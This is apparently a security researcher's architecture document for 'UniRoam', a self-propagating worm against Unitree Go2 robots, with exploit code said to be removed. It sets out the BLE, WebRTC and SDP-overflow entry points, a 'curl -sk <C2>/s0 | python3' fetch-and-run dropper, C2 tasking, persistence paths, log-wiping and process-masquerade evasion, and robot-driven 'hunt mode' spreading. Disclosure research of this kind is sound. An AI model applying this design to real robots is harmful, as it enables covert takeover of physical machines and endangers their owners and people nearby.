# UniRoam Architecture

This document describes the design of the UniRoam autonomous robot worm, as presented at WISCON 2026. All exploit primitives have been removed from this release; this document explains the *architecture* - how the pieces fit together and why each design decision was made.

## Threat model

UniRoam targets Unitree Go2 quadruped robots. These run Ubuntu 20.04 on an aarch64 SoC with:

- Python 3.8+ pre-installed
- `curl` and `wget` available
- BLE radio (always on, used for the Unitree mobile app)
- WiFi radio (can operate in both AP and STA mode)
- DDS middleware (CycloneDDS, used for internal robotics communication)
- WebRTC bridge (for video streaming and remote control)

The robot is a full Linux computer with radios, sensors, and motors. It runs as root by default.

## Initial access vectors

UniRoam implemented three independent initial access paths. Each targeted a different entry point on the robot:

### 1. BLE command injection (CVE-2025-35027)

**Discovery:** Bin4ry, h0stile, legion1581

The Go2's BLE WiFi provisioning service accepts SSID and password values that are passed unsanitized to `wpa_supplicant` via a shell. Injecting shell metacharacters in the password field achieves root code execution.

The entire Unitree product line shared the same hardcoded AES key, IV, and handshake secret for BLE communication. Any device within BLE range (~10-30m) could connect and exploit this without authentication.

**UniRoam's use:** Primary initial access vector. BLE range made this suitable for conference/event scenarios and robot-to-robot propagation.

### 2. WebRTC data channel (CVE-2026-27509)

**Discovery:** Boschko, Ruikai Peng

The `programming_actuator` service accepts and executes arbitrary Python code uploaded via the WebRTC data channel, with no authentication. The `webrtc_bridge` service sits inside the DDS security perimeter and forwards messages between the WebRTC data channel and the internal DDS bus without filtering.

**UniRoam's use:** LAN propagation vector. Once a worm agent had network access on the robot subnet, it could exploit other robots via their signaling endpoint (port 9991) without needing BLE range.

### 3. SDP heap overflow (CVE pending, patched)

A memory corruption vulnerability in the WebRTC SDP parser (derived from the AWS KVS WebRTC SDK). A crafted SDP offer with an oversized media attribute name overflows into the `sessionAttributesCount` field, causing the parser to read attacker-controlled data as a DTLS fingerprint. This enables a DTLS man-in-the-middle, granting full data channel access - and therefore RCE via `programming_actuator`.

**UniRoam's use:** Pre-authentication LAN propagation. Unlike vector #2, this required no prior knowledge of the target and worked against stock firmware with default settings. The overflow could be delivered via DDS multicast, meaning a single compromised robot on the subnet could exploit all others simultaneously.

## Payload chain

The payload is delivered in three stages, designed around the constraints of the BLE injection channel:

```
BLE injection payload limit: ~200 bytes usable
    │
    ▼
┌── Stage 0 (dropper) ──────────────────────────────────────────┐
│                                                                │
│  Delivered via:  curl -sk <C2>/s0 | python3                   │
│  Size: ~500 bytes                                              │
│  Dependencies: stdlib only (urllib.request, json, socket)      │
│                                                                │
│  Actions:                                                      │
│    1. Derive robot ID from hostname + MAC address              │
│    2. Beacon to C2 (robot appears in dashboard)                │
│    3. Download + exec Stage 1                                  │
│                                                                │
│  Design rationale: must fit in BLE injection payload.          │
│  The curl|python3 one-liner is the actual injected command;    │
│  Stage 0 is what that command downloads and runs.              │
└───────────────────────────────────┬────────────────────────────┘
                                    │
                                    ▼
┌── Stage 1 (downloader) ───────────────────────────────────────┐
│                                                                │
│  Size: ~400 bytes                                              │
│  Dependencies: stdlib only                                     │
│                                                                │
│  Actions:                                                      │
│    1. Kill any existing agent process                          │
│    2. Download memfd stub loader from C2                       │
│    3. Write stub to install path, chmod +x                     │
│    4. Launch stub detached (start_new_session=True)            │
│                                                                │
│  Design rationale: separates "get code on disk" from "run      │
│  the agent." The stub provides persistence (it's on disk)      │
│  while Stage 2 runs from memory (fileless).                    │
└───────────────────────────────────┬────────────────────────────┘
                                    │
                                    ▼
┌── Stub loader (memfd) ────────────────────────────────────────┐
│                                                                │
│  Actions:                                                      │
│    1. memfd_create("", 0) via ctypes - anonymous memory fd     │
│    2. Fetch Stage 2 from C2, write to fd                       │
│    3. exec() from /proc/self/fd/<N>                            │
│                                                                │
│  Design rationale: Stage 2 never touches disk. The stub is     │
│  the only file written. If a defender finds and deletes the    │
│  stub, the running Stage 2 agent is unaffected (it's in       │
│  memory). If the agent is killed, the stub (or cron/systemd)  │
│  relaunches it.                                                │
└───────────────────────────────────┬────────────────────────────┘
                                    │
                                    ▼
┌── Stage 2 (worm agent) ───────────────────────────────────────┐
│                                                                │
│  Size: ~1500 lines                                             │
│  Dependencies: ZERO (stdlib only, including pure-Python AES)   │
│                                                                │
│  Core loops:                                                   │
│    - Beacon loop (jittered 60-300s)                            │
│    - Task polling + execution                                  │
│    - Propagation loop (BLE, WebRTC, DDS)                       │
│                                                                │
│  Design rationale: a Go2 has Python but not pip. The agent     │
│  must run on stock firmware with zero setup. This drove the    │
│  pure-Python AES implementation (for BLE packet crypto) and    │
│  the gatttool/hcitool subprocess calls (for BLE scanning       │
│  and exploitation from the robot itself).                      │
└────────────────────────────────────────────────────────────────┘
```

## C2 infrastructure

The C2 server is a FastAPI application that provides:

- **Beacon ingestion** - robots check in with system info, the C2 tracks last-seen timestamps and assigns tasks
- **Task dispatch** - operator issues commands (EXECUTE_CMD, COLLECT_INTEL, SELF_DESTRUCT, PROPAGATE_*) that are queued per-robot and picked up on the next beacon
- **Payload serving** - Stages 0/1/2 and the stub loader are served dynamically, with C2 URL and API key injected via string replacement at serve time
- **Web dashboard** - real-time robot table, D3.js infection chain force graph, task results panel, control interface
- **Infection graph** - tracks parent→child relationships so the full propagation chain is visible

## Propagation methods

### BLE (robot-to-robot, physical)

Once an agent is running on a robot, it uses the robot's own BLE radio to scan for and infect nearby robots:

1. `hcitool lescan` - discover nearby BLE devices
2. Filter for Unitree model prefixes (Go2_, G1_, etc.)
3. Check infection tracker (skip already-infected or blacklisted)
4. Check rate limiter (max 5 infections/hour)
5. `gatttool` - connect and run the 7-step BLE exploit chain
6. Mark result in tracker

This is how the worm physically spreads. BLE range is typically 10-30m, so propagation follows physical proximity.

### WebRTC bridge (LAN, network)

The agent scans the local subnet for port 9991 (the Go2's WebRTC signaling endpoint):

1. TCP port scan of 192.168.123.0/24 on port 9991
2. For each open port: establish WebRTC data channel
3. Upload Python payload to `programming_actuator`
4. Trigger execution via fake controller hotkey press
5. The payload is a new Stage 0 dropper that calls back to C2

### DDS multicast (LAN, pre-auth)

On custom firmware robots with CycloneDDS access:

1. SPDP/SEDP multicast discovery - enumerate all DDS participants on the LAN
2. For each discovered participant: inject crafted SDP via `rt/webrtcreq` topic
3. The SDP overflow corrupts the target's DTLS fingerprint validation
4. Establish data channel → upload payload → trigger

## Persistence

Four independent mechanisms, designed so that removing any single one is insufficient:

| Mechanism | Path | Restart trigger |
|-----------|------|-----------------|
| systemd service | `/etc/systemd/system/unitree-service.service` | Boot, process death |
| cron job | `/etc/cron.d/apt-compat` | Every 15 minutes |
| rc.local | `/etc/rc.local` (appended line) | Boot |
| Watchdog | `/usr/local/bin/unitree-watchdog` | Every 30 seconds |

The agent and watchdog form a mutual-restart pair. Additionally, the install path and binary name are chosen to blend with existing Unitree software, and timestamps are masqueraded to match reference system binaries.

## OpSec

- **Process masquerade:** `prctl(PR_SET_NAME)` to rename the Python process to look like `[kworker/0:1]`, `systemd-journald`, etc.
- **Fileless execution:** Stage 2 runs from `memfd_create()` - no file on disk
- **Log cleaning:** bash_history, auth.log, syslog, journal vacuum
- **Timestamp masquerade:** agent binary's mtime/atime copied from `/usr/bin/python3`
- **Dead man's switch:** auto-cleanup after 48 hours without C2 contact

## Hunt mode

The most novel capability: using the infected robot's mobility to physically seek out other robots.

The hunt state machine drives the robot through an expanding square spiral search pattern while continuously scanning BLE. When a target is detected:

1. **DETECTED** - target exists, prepare bearing sweep
2. **BEARING** - 360-degree rotation, recording RSSI at each step
3. **APPROACHING** - move toward strongest-signal bearing, tracking RSSI
4. **IN_RANGE** - RSSI indicates BLE exploit range (~5m), fire exploit

This turns the infected robot into an autonomous hunter that physically navigates its environment to find and infect other robots.
